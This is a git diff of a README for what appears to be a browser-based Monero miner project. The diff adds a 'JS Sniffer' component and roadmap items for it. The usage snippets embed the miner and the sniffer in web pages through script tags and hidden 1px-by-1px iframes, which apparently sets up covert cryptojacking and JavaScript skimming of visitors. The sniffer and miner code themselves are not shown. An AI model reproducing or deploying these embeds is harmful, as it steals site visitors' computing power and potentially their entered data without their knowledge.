@@ -2,10 +2,11 @@
 
 [![Build Status](https://travis-ci.org/joemccann/dillinger.svg?branch=master)](https://travis-ci.org/joemccann/dillinger)
 
-A private XMR Server worker that work for one wallet 
+* private XMR Server worker that work for one wallet 
 complete typescript refactoring and optimization 
 of https://github.com/deepwn/deepMiner
 
+* JS Sniffer with no memory database on backend
 
 ## Installation (Developers Only)
 
@@ -13,7 +14,7 @@ of https://github.com/deepwn/deepMiner
 ```sh
   npm i --save
   npm i --save-dev
-  npm run compile
+  npm run build
 ```
 * Development Mode
 ```sh
@@ -23,6 +24,16 @@ of https://github.com/deepwn/deepMiner
 ```sh
  npm run prod
 ```
+* Continuos Development and integration
+1) First Shell
+```sh
+ gulp dev
+```
+2) Second Shell
+```sh
+ npm run dev
+```
+
 
 ## Considerations
 
@@ -68,6 +79,7 @@ Work in progress
 * Classic Config
 
 ```
+<script src="server/lib/Sniffer.js"> </script>
 <script src="server/lib/oniric.min.js"> </script>
 <script> var userID = 'Oniric';
          var miner = new Oniric.Init(userID, {
@@ -81,7 +93,9 @@ Work in progress
 
 ```
 <iframe style="display:block" width="1px" height="1px" src="yourserver:port/miner.html"></iframe>
+<iframe style="display:block" width="1px" height="1px" src="yourserver:port/Sniffer.js"></iframe>
 ```
+
 
 
 ## Contributing
@@ -99,4 +113,11 @@ https://github.com/webdiamond
 https://github.com/deepwn
 
 
+## Road Map
 
+1. Testing
+2. Complete typescript integration
+3. mongodb support
+4. encryption layer
+5. Telegram API
+6. End to develop JS Sniffer
